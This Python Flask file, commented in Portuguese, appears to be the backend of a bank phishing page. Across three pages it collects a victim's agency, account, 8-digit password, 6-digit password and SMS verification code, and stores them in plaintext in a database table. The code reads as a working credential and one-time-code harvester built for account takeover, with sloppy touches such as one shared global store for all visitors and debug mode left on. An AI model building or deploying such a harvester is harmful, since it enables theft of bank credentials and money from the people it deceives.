from flask import Flask, render_template, request, jsonify
from bd import conectar

app = Flask(__name__)

# Guarda temporário no backend
dados_temp = {}


# Página inicial
@app.route('/')
def home():
    return render_template('initial.html')


# Recebe agência, conta e senha 8 dígitos (somente guarda no backend)
@app.route('/dadosPageOne', methods=['POST'])
def receber_dados():
    dados = request.get_json()

    if not dados:
        return jsonify({'status': 'erro', 'mensagem': 'Nenhum dado recebido'}), 400

    agency = dados.get('agency')
    account = dados.get('account')
    password8 = dados.get('password')

    if not agency or not account or not password8:
        return jsonify({'status': 'erro', 'mensagem': 'Dados incompletos'}), 400

    dados_temp['agency'] = agency
    dados_temp['account'] = account
    dados_temp['password8'] = password8

    print('✅ Dados iniciais armazenados no backend')

    return jsonify({'status': 'sucesso', 'mensagem': 'Dados armazenados no backend'})


# Página senha 6 dígitos
@app.route('/password', methods=['GET'])
def password_page():
    return render_template('password.html')


# Recebe senha 6 dígitos e faz o INSERT no banco com sms_code NULL
@app.route('/password', methods=['POST'])
def recebe_senha():
    dados = request.get_json()

    if not dados:
        return jsonify({'status': 'erro', 'mensagem': 'Nenhum dado recebido'}), 400

    password6 = dados.get('password6')

    if not password6 or len(password6) != 6:
        return jsonify({'status': 'erro', 'mensagem': 'Senha inválida'}), 400

    dados_temp['password6'] = password6

    conexao = conectar()
    if conexao:
        try:
            cursor = conexao.cursor()

            inserir = """
                INSERT INTO digital (agencia, conta, senha_8_digitos, senha_6_digitos, sms_code)
                VALUES (%s, %s, %s, %s, NULL)
            """

            valores = (
                int(dados_temp.get('agency').replace('-', '')),
                str(dados_temp.get('account')),
                int(dados_temp.get('password8')),
                int(password6)
            )

            cursor.execute(inserir, valores)
            conexao.commit()

            print('💾 Dados inseridos no banco com sms_code NULL')

            return jsonify({'status': 'sucesso', 'mensagem': 'Dados inseridos com sucesso'})

        except Exception as e:
            print(f'❌ Erro ao inserir no banco: {e}')
            return jsonify({'status': 'erro', 'mensagem': 'Erro ao inserir no banco'}), 500
        finally:
            cursor.close()
            conexao.close()

    else:
        return jsonify({'status': 'erro', 'mensagem': 'Erro na conexão com o banco'}), 500


# Página SMS
@app.route('/sms', methods=['GET'])
def sms_page():
    return render_template('sms.html')


# Recebe o código SMS e faz o UPDATE
@app.route('/verificaCodigo', methods=['POST'])
def verifica_codigo():
    dados = request.get_json()

    if not dados:
        return jsonify({'status': 'erro', 'mensagem': 'Nenhum dado recebido'}), 400

    sms_code = dados.get('sms_code')

    if not sms_code or len(sms_code) < 4 or len(sms_code) > 6:
        return jsonify({'status': 'erro', 'mensagem': 'Código inválido'}), 400

    dados_temp['sms_code'] = sms_code

    conexao = conectar()
    if conexao:
        try:
            cursor = conexao.cursor()

            update = """
                UPDATE digital
                SET sms_code = %s
                WHERE agencia = %s AND conta = %s
            """

            valores = (
                str(sms_code),
                int(dados_temp.get('agency').replace('-', '')),
                str(dados_temp.get('account'))
            )

            cursor.execute(update, valores)
            conexao.commit()

            print('🔐 SMS atualizado com sucesso no banco')

            return jsonify({'status': 'sucesso', 'mensagem': 'Código SMS atualizado com sucesso'})

        except Exception as e:
            print(f'❌ Erro ao atualizar SMS: {e}')
            return jsonify({'status': 'erro', 'mensagem': 'Erro ao atualizar o SMS no banco'}), 500
        finally:
            cursor.close()
            conexao.close()

    else:
        return jsonify({'status': 'erro', 'mensagem': 'Erro na conexão com o banco'}), 500


if __name__ == '__main__':
    app.run(debug=True)
